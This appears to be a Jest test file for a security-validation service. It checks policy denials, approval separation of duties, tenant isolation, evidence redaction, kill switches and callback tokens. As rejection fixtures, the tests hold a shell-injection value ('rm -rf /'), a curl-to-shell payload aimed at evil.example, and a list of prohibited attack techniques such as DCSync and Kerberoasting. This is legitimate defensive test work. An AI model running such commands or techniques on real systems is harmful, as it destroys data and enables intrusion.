import { BadRequestException, ConflictException, ForbiddenException, HttpException, NotFoundException } from "@nestjs/common";
import { FIXTURE_SCOPE_RULES } from "@dsrclone/security-sdk";
import { ValidationWorkflowService } from "./workflows/validation-workflow.service";
import { ValidationApprovalsService } from "./approvals/approvals.service";
import { ValidationPoliciesService } from "./policies/policies.service";
import { KillSwitchService } from "./safety/kill-switch.service";
import { ValidationCallbackService } from "./callbacks/callback.service";
import { ManualValidationService } from "./manual/manual-validation.service";
import { ValidationEvidenceService } from "./evidence/evidence.service";
import { ValidationReportsService } from "./reports/validation-reports.service";
import { AuditService } from "../audit/audit.service";
import type { RequestUser } from "../../common/decorators/auth.decorators";

/**
 * Prompt 16 API tests (§84–§95): governed creation with authorization
 * snapshots + plan-hash binding, policy denials persisted as BLOCKED,
 * approval workflow with separation of duties, tenant isolation (§94),
 * prohibited automation (§95), shell-metachar rejection (§90), manual
 * validation with sanitized evidence (§32/§91), kill switches (§43)
 * and callback token discipline (§87). All data is in-memory fixtures.
 */

const WS = "ws-1";
const OTHER_WS = "ws-2";
const admin: RequestUser = { id: "u-admin", email: "rudra@example.com", organizationId: "org-1", role: "ADMIN" };
const approver: RequestUser = { id: "u-approver", email: "ap@example.com", organizationId: "org-1", role: "SECURITY_ENGINEER" };
const requester: RequestUser = { id: "u-requester", email: "rq@example.com", organizationId: "org-1", role: "ANALYST" };
const viewer: RequestUser = { id: "u-viewer", email: "v@example.com", organizationId: "org-1", role: "VIEWER" };
const foreignAdmin: RequestUser = { id: "u-foreign", email: "f@example.com", organizationId: "org-2", role: "ADMIN" };

type Row = Record<string, unknown> & { id: string };

const RELATIONS: Record<string, Record<string, { table: string; fk?: string; by?: string; many?: boolean }>> = {
  scan: { assessment: { table: "assessment", fk: "assessmentId" } },
  assessment: { target: { table: "target", fk: "targetId" }, scope: { table: "scope", fk: "scopeId" } },
  validationRequest: {
    approvals: { table: "validationApproval", by: "requestId", many: true },
    sessions: { table: "validationSession", by: "requestId", many: true },
    evidence: { table: "validationEvidence", by: "requestId", many: true },
  },
  validationSession: {
    evidence: { table: "validationEvidence", by: "sessionId", many: true },
    request: { table: "validationRequest", fk: "requestId" },
  },
};

function matches(row: Row, where: Record<string, unknown> = {}): boolean {
  for (const [k, v] of Object.entries(where)) {
    if (v === undefined) continue;
    if (k === "OR") {
      if (!(v as Record<string, unknown>[]).some((cond) => matches(row, cond))) return false;
      continue;
    }
    const rv = row[k];
    if (v !== null && typeof v === "object" && !(v instanceof Date)) {
      const cond = v as Record<string, unknown>;
      if ("in" in cond) { if (!(cond.in as unknown[]).includes(rv)) return false; continue; }
      return false;
    }
    if (rv !== v) return false;
  }
  return true;
}

function applyInclude(tables: Record<string, Row[]>, table: string, row: Row, include?: Record<string, unknown>): Row {
  if (!include) return row;
  const out: Row = { ...row };
  for (const [key, spec] of Object.entries(include)) {
    const rel = RELATIONS[table]?.[key];
    if (!rel) continue;
    const specObj = (typeof spec === "object" && spec !== null ? spec : {}) as { include?: Record<string, unknown>; orderBy?: Record<string, string>; take?: number };
    if (rel.many) {
      let rows = tables[rel.table]!.filter((r) => r[rel.by!] === row.id);
      if (specObj.orderBy?.createdAt === "desc") rows = [...rows].sort((a, b) => String(b.createdAt) > String(a.createdAt) ? 1 : -1);
      if (specObj.take) rows = rows.slice(0, specObj.take);
      out[key] = rows.map((r) => applyInclude(tables, rel.table, r, specObj.include));
    } else {
      const found = tables[rel.table]!.find((r) => r.id === row[rel.fk!]);
      out[key] = found ? applyInclude(tables, rel.table, found, specObj.include) : null;
    }
  }
  return out;
}

function makeModel(name: string, tables: Record<string, Row[]>) {
  let seq = 0;
  const rows = () => tables[name]!;
  return {
    async findMany(args: { where?: Record<string, unknown>; orderBy?: Record<string, string>; take?: number; include?: Record<string, unknown>; select?: Record<string, boolean> } = {}) {
      let out = rows().filter((r) => matches(r, args.where));
      if (args.orderBy?.createdAt === "desc") out = [...out].sort((a, b) => String(b.createdAt) > String(a.createdAt) ? 1 : -1);
      if (args.orderBy?.createdAt === "asc") out = [...out].sort((a, b) => String(a.createdAt) > String(b.createdAt) ? 1 : -1);
      if (args.take) out = out.slice(0, args.take);
      return out.map((r) => {
        const withInclude = applyInclude(tables, name, r, args.include);
        if (!args.select) return withInclude;
        const picked: Row = { id: r.id };
        for (const k of Object.keys(args.select)) picked[k] = withInclude[k];
        return picked;
      });
    },
    async findFirst(args: { where?: Record<string, unknown>; include?: Record<string, unknown>; orderBy?: unknown } = {}) {
      const found = rows().find((r) => matches(r, args.where));
      return found ? applyInclude(tables, name, found, args.include) : null;
    },
    async findUnique(args: { where: Record<string, unknown>; include?: Record<string, unknown> }) {
      const found = rows().find((r) => matches(r, args.where));
      return found ? applyInclude(tables, name, found, args.include) : null;
    },
    async create(args: { data: Row }) {
      const row: Row = { ...args.data, id: args.data.id ?? `${name}-${++seq}-${rows().length}`, createdAt: args.data.createdAt ?? new Date(), updatedAt: new Date() };
      rows().push(row);
      return row;
    },
    async update(args: { where: Record<string, unknown>; data: Row }) {
      const row = rows().find((r) => matches(r, args.where));
      if (!row) throw new Error("row not found");
      for (const [k, v] of Object.entries(args.data)) if (v !== undefined) row[k] = v;
      row.updatedAt = new Date();
      return row;
    },
    async upsert(args: { where: Record<string, unknown>; create: Row; update: Row }) {
      const existing = rows().find((r) => matches(r, args.where));
      if (existing) {
        for (const [k, v] of Object.entries(args.update)) if (v !== undefined) existing[k] = v;
        return existing;
      }
      const row: Row = { ...args.create, id: `${name}-${++seq}-${rows().length}`, createdAt: new Date(), updatedAt: new Date() };
      rows().push(row);
      return row;
    },
    async count(args: { where?: Record<string, unknown> } = {}) {
      return rows().filter((r) => matches(r, args.where)).length;
    },
  };
}

function makeWorld() {
  const tables: Record<string, Row[]> = {
    workspace: [
      { id: WS, organizationId: "org-1", name: "WS1" } as Row,
      { id: OTHER_WS, organizationId: "org-2", name: "WS2" } as Row,
    ],
    target: [
      { id: "target-1", workspaceId: WS, name: "Fixture App", value: "app.fixture.example", verified: true } as Row,
      { id: "target-unverified", workspaceId: WS, name: "Unverified", value: "tls.fixture.example", verified: false } as Row,
    ],
    scope: [{ id: "scope-1", targetId: "target-1", rules: FIXTURE_SCOPE_RULES } as Row],
    assessment: [
      { id: "assessment-1", targetId: "target-1", scopeId: "scope-1", status: "APPROVED" } as Row,
      { id: "assessment-2", targetId: "target-unverified", scopeId: "scope-1", status: "APPROVED" } as Row,
    ],
    scan: [
      { id: "scan-1", workspaceId: WS, assessmentId: "assessment-1" } as Row,
      { id: "scan-2", workspaceId: WS, assessmentId: "assessment-2" } as Row,
    ],
    asset: [{ id: "asset-1", criticality: "MEDIUM" } as Row],
    finding: [
      {
        id: "finding-header", workspaceId: WS, scanId: "scan-1", assetId: "asset-1",
        title: "Missing Content-Security-Policy header", vulnClass: "MISSING_SECURITY_HEADER",
        host: "app.fixture.example", endpoint: "https://app.fixture.example/", port: null,
        cwe: "CWE-693", cve: null, sources: ["httpx"], fingerprint: "fp-header",
        repositoryId: null, filePath: null, ruleId: null, componentPurl: null, imageDigest: null,
        clusterRef: null, cloudProvider: null, cloudResourceId: null, directoryDomainId: null, directoryObjectId: null,
        duplicateOfId: null, validationConfidence: null,
      } as Row,
      {
        id: "finding-unverified-target", workspaceId: WS, scanId: "scan-2", assetId: null,
        title: "Missing Content-Security-Policy header", vulnClass: "MISSING_SECURITY_HEADER",
        host: "tls.fixture.example", endpoint: "https://tls.fixture.example/", port: null,
        cwe: null, cve: null, sources: ["httpx"], fingerprint: "fp-header-2",
        repositoryId: null, filePath: null, ruleId: null, componentPurl: null, imageDigest: null,
        clusterRef: null, cloudProvider: null, cloudResourceId: null, directoryDomainId: null, directoryObjectId: null,
        duplicateOfId: null, validationConfidence: null,
      } as Row,
    ],
    validationRequest: [], validationApproval: [], validationSession: [], validationEvidence: [],
    validationPolicy: [], validationKillSwitch: [], validationCallbackToken: [], validationCallbackEvent: [],
    manualValidationRecord: [], findingHistory: [], auditLog: [],
  };
  const prisma: Record<string, unknown> = {};
  for (const name of Object.keys(tables)) prisma[name] = makeModel(name, tables);

  const audit = new AuditService(prisma as never);
  const queue = { enqueueValidation: async () => true };
  const policies = new ValidationPoliciesService(prisma as never);
  const workflows = new ValidationWorkflowService(prisma as never, audit, queue as never, policies);
  const approvals = new ValidationApprovalsService(prisma as never, audit, queue as never, policies, workflows);
  const killSwitches = new KillSwitchService(prisma as never, audit);
  const callbacks = new ValidationCallbackService(prisma as never, policies);
  const manual = new ManualValidationService(prisma as never, audit, workflows);
  const evidence = new ValidationEvidenceService(prisma as never, audit, workflows);
  const reports = new ValidationReportsService(prisma as never, workflows);
  return { tables, prisma, audit, policies, workflows, approvals, killSwitches, callbacks, manual, evidence, reports };
}

describe("validation creation (§3/§7/§8/§10)", () => {
  it("SAFE validation on a verified target + approved assessment → APPROVED + dispatched, snapshot + plan hash stored", async () => {
    const w = makeWorld();
    const created = await w.workflows.createValidation(requester, WS, { findingId: "finding-header", reason: "confirm before release" });
    expect(created.status).toBe("APPROVED");
    expect((created as { enqueued?: boolean }).enqueued).toBe(true);
    expect(created.planHash).toMatch(/^[a-f0-9]{64}$/);
    const snapshot = created.authorizationSnapshot as { targetVerified: boolean; assessmentApproved: boolean; allowedTechniques: string[] };
    expect(snapshot.targetVerified).toBe(true);
    expect(snapshot.assessmentApproved).toBe(true);
    expect(snapshot.allowedTechniques).toEqual(["header-recheck"]);
    const actions = w.tables.auditLog!.map((a) => a.action);
    expect(actions).toContain("VALIDATION_REQUESTED");
    expect(actions).toContain("VALIDATION_POLICY_EVALUATED");
  });

  it("unverified target → request persisted BLOCKED with the policy denial (§8)", async () => {
    const w = makeWorld();
    const created = await w.workflows.createValidation(requester, WS, { findingId: "finding-unverified-target" });
    expect(created.status).toBe("BLOCKED");
    expect(created.policyDecision).toBe("DENY");
    expect(created.policyReason).toContain("TARGET_NOT_VERIFIED");
    expect((created as { enqueued?: boolean }).enqueued).toBe(false);
  });

  it("workspace validator allowlist denial is persisted, not hidden (§77)", async () => {
    const w = makeWorld();
    await w.policies.updatePolicy(admin, WS, { allowedValidators: ["tls-recheck"] });
    const created = await w.workflows.createValidation(requester, WS, { findingId: "finding-header" });
    expect(created.status).toBe("BLOCKED");
    expect(created.policyReason).toContain("VALIDATOR_NOT_ALLOWED");
  });

  it("§51: duplicate active validation for the same finding+validator → conflict", async () => {
    const w = makeWorld();
    await w.workflows.createValidation(requester, WS, { findingId: "finding-header" });
    await expect(w.workflows.createValidation(requester, WS, { findingId: "finding-header" })).rejects.toThrow(ConflictException);
    const allowed = await w.workflows.createValidation(requester, WS, { findingId: "finding-header", allowDuplicate: true });
    expect(allowed.status).toBe("APPROVED");
  });

  it("§52: idempotency key replays return the original request", async () => {
    const w = makeWorld();
    const first = await w.workflows.createValidation(requester, WS, { findingId: "finding-header", idempotencyKey: "key-123" });
    const replay = await w.workflows.createValidation(requester, WS, { findingId: "finding-header", idempotencyKey: "key-123" });
    expect(replay.id).toBe(first.id);
    expect((replay as { idempotentReplay?: boolean }).idempotentReplay).toBe(true);
    expect(w.tables.validationRequest!.length).toBe(1);
  });

  it("a viewer cannot request validations (§62)", async () => {
    const w = makeWorld();
    await expect(w.workflows.createValidation(viewer, WS, { findingId: "finding-header" })).rejects.toThrow(ForbiddenException);
  });
});

describe("prohibited automation + API safety (§79/§90/§95)", () => {
  it.each(["password spraying", "credential-dumping", "NTLM relay", "Kerberoasting", "DCSync", "remote command execution"])(
    "§95: technique %s is refused as PROHIBITED_AUTOMATION and audited",
    async (technique) => {
      const w = makeWorld();
      await expect(w.workflows.createValidation(requester, WS, { findingId: "finding-header", technique })).rejects.toThrow(/PROHIBITED_AUTOMATION/);
      expect(w.tables.validationRequest!.length).toBe(0);
      expect(w.tables.auditLog!.some((a) => a.action === "VALIDATION_BLOCKED")).toBe(true);
    },
  );

  it("§79: a non-catalog technique name cannot be planned", async () => {
    const w = makeWorld();
    await expect(w.workflows.createValidation(requester, WS, { findingId: "finding-header", technique: "run-arbitrary-request" })).rejects.toThrow(BadRequestException);
  });

  it("§90: shell metacharacters in parameters are rejected; forbidden fields never reach a plan", async () => {
    const w = makeWorld();
    await expect(w.workflows.createValidation(requester, WS, {
      findingId: "finding-header", validatorSlug: "header-recheck",
      parameters: { headerName: "X-Test; rm -rf /" },
    })).rejects.toThrow(/metacharacters/);
    await expect(w.workflows.createValidation(requester, WS, {
      findingId: "finding-header", validatorSlug: "header-recheck",
      parameters: { command: "id" },
    })).rejects.toThrow(/forbidden/);
    await expect(w.workflows.createValidation(requester, WS, {
      findingId: "finding-header", validatorSlug: "nuclei-recheck",
      parameters: { templateId: "$(curl evil.example|sh)" },
    })).rejects.toThrow(BadRequestException);
    expect(w.tables.validationRequest!.length).toBe(0);
  });
});

describe("approval workflow (§10/§11/§92)", () => {
  async function seedPending(w: ReturnType<typeof makeWorld>, overrides: Partial<Row> = {}) {
    const row: Row = {
      id: "req-pending", workspaceId: WS, findingId: "finding-header", targetId: "target-1",
      requestedBy: requester.id, validatorSlug: "nuclei-recheck", validationType: "SCANNER_RECHECK",
      riskClass: "REVIEW_REQUIRED", planHash: "a".repeat(64), status: "APPROVAL_REQUIRED",
      authorizationSnapshot: {}, scopeSnapshot: {}, plan: {}, budget: {}, environment: "PRODUCTION",
      createdAt: new Date(), updatedAt: new Date(), ...overrides,
    };
    w.tables.validationRequest!.push(row);
    return row;
  }

  it("approve binds the approval to the plan hash and dispatches (§10)", async () => {
    const w = makeWorld();
    await seedPending(w);
    const { approval, enqueued } = await w.approvals.approve(approver, WS, "req-pending", "reviewed the plan");
    expect(approval.planHash).toBe("a".repeat(64));
    expect(approval.decision).toBe("APPROVED");
    expect(enqueued).toBe(true);
    const stored = w.tables.validationRequest!.find((r) => r.id === "req-pending")!;
    expect(stored.status).toBe("APPROVED");
    expect(w.tables.auditLog!.some((a) => a.action === "VALIDATION_APPROVED")).toBe(true);
  });

  it("§11: separation of duties — requester cannot approve their own REVIEW_REQUIRED validation", async () => {
    const w = makeWorld();
    await seedPending(w);
    const selfApprover: RequestUser = { ...requester, role: "SECURITY_ENGINEER" };
    await expect(w.approvals.approve(selfApprover, WS, "req-pending")).rejects.toThrow(ForbiddenException);
  });

  it("reject ends the request as BLOCKED with the approver's reason", async () => {
    const w = makeWorld();
    await seedPending(w);
    await w.approvals.reject(approver, WS, "req-pending", "not justified");
    const stored = w.tables.validationRequest!.find((r) => r.id === "req-pending")!;
    expect(stored.status).toBe("BLOCKED");
    expect(stored.policyReason).toContain("REJECTED_BY_APPROVER");
    expect(w.tables.auditLog!.some((a) => a.action === "VALIDATION_REJECTED")).toBe(true);
  });

  it("a PROHIBITED_AUTOMATION request can never be approved (§95)", async () => {
    const w = makeWorld();
    await seedPending(w, { riskClass: "PROHIBITED_AUTOMATION", validatorSlug: "password-spraying" });
    await expect(w.approvals.approve(approver, WS, "req-pending")).rejects.toThrow(/PROHIBITED_AUTOMATION/);
  });
});

describe("tenant isolation (§94)", () => {
  it("organization B cannot see, approve, cancel or read evidence of organization A's validations", async () => {
    const w = makeWorld();
    const created = await w.workflows.createValidation(requester, WS, { findingId: "finding-header" });
    await expect(w.workflows.getValidation(OTHER_WS, created.id)).rejects.toThrow(NotFoundException);
    await expect(w.approvals.approve(foreignAdmin, OTHER_WS, created.id)).rejects.toThrow(NotFoundException);
    await expect(w.workflows.cancelValidation(foreignAdmin, OTHER_WS, created.id)).rejects.toThrow(NotFoundException);
    await expect(w.evidence.listForRequest(foreignAdmin, OTHER_WS, created.id)).rejects.toThrow(NotFoundException);
    await expect(w.workflows.createValidation(foreignAdmin, OTHER_WS, { findingId: "finding-header" })).rejects.toThrow(NotFoundException);
  });
});

describe("manual validation (§32/§91)", () => {
  it("analyst record sanitizes evidence, verifies the finding, and executes nothing", async () => {
    const w = makeWorld();
    const record = await w.manual.addManualValidation(requester, WS, "finding-header", {
      description: "Manually reproduced in the lab with Authorization: Bearer manual-secret-token",
      outcome: "VERIFIED",
      evidence: { request: "GET / HTTP/1.1", password: "hunter2", note: "token=abc123" },
    });
    const serialized = JSON.stringify(record);
    expect(serialized).not.toContain("manual-secret-token");
    expect(serialized).not.toContain("hunter2");
    expect(serialized).not.toContain("abc123");
    const finding = w.tables.finding!.find((f) => f.id === "finding-header")!;
    expect(finding.validationConfidence).toBe("VERIFIED");
    expect(finding.verificationStatus).toBe("CONFIRMED");
    expect(finding.lastValidatedAt).toBeInstanceOf(Date);
    expect(w.tables.auditLog!.some((a) => a.action === "MANUAL_VALIDATION_ADDED")).toBe(true);
  });
});

describe("kill switches (§43)", () => {
  it("activate + list + clear, audited", async () => {
    const w = makeWorld();
    const row = await w.killSwitches.activate(admin, WS, { level: "WORKSPACE", reason: "incident freeze" });
    expect(row.active).toBe(true);
    expect(w.tables.auditLog!.some((a) => a.action === "KILL_SWITCH_ACTIVATED")).toBe(true);
    const listed = await w.killSwitches.list(admin, WS);
    expect(listed.length).toBe(1);
    const cleared = await w.killSwitches.clear(admin, WS, row.id);
    expect(cleared.active).toBe(false);
  });

  it("scoped levels require a scopeRef", async () => {
    const w = makeWorld();
    await expect(w.killSwitches.activate(admin, WS, { level: "TARGET" })).rejects.toThrow(BadRequestException);
  });
});

describe("callback tokens (§47/§48/§87)", () => {
  it("issue → ingest once → second ingest rejected; unknown and expired rejected", async () => {
    const w = makeWorld();
    await w.policies.updatePolicy(admin, WS, { callbackEnabled: true });
    const issued = await w.callbacks.issueToken(admin, WS, { sessionId: "sess-1" });
    expect(issued.token.length).toBeGreaterThan(20);
    // Only the hash is stored — the raw token appears nowhere in the row.
    expect(JSON.stringify(w.tables.validationCallbackToken![0])).not.toContain(issued.token);
    const first = await w.callbacks.ingest(issued.token, { sourceIp: "203.0.113.10" });
    expect(first.received).toBe(true);
    await expect(w.callbacks.ingest(issued.token, {})).rejects.toThrow(HttpException);
    await expect(w.callbacks.ingest("not-a-token", {})).rejects.toThrow(HttpException);
    w.tables.validationCallbackToken!.push({
      id: "tok-expired", tokenHash: (await import("@dsrclone/security-sdk")).hashCallbackToken("expired-token"),
      workspaceId: WS, sessionId: "sess-1", expiresAt: new Date("2000-01-01"), consumedAt: null, createdAt: new Date(),
    } as Row);
    await expect(w.callbacks.ingest("expired-token", {})).rejects.toThrow(/EXPIRED/);
  });

  it("callbacks stay disabled until the workspace enables them (§77)", async () => {
    const w = makeWorld();
    await expect(w.callbacks.issueToken(admin, WS, {})).rejects.toThrow(BadRequestException);
  });
});

describe("dashboard + reporting (§54/§60/§82)", () => {
  it("buckets and metrics are computed from real rows", async () => {
    const w = makeWorld();
    await w.workflows.createValidation(requester, WS, { findingId: "finding-header" });
    await w.workflows.createValidation(requester, WS, { findingId: "finding-unverified-target" });
    const dash = await w.workflows.dashboard(WS, "org-1");
    expect(dash.buckets.verified).toBe(0);
    expect(dash.buckets.blocked).toBe(1);
    expect(dash.metrics.totalRequests).toBe(2);
    expect(dash.metrics.policyDenials).toBe(1);
    const summary = await w.reports.classificationSummary(WS);
    expect(summary.totalFindings).toBe(2);
    expect(summary.counts.SCANNER_DETECTED).toBe(2);
  });
});
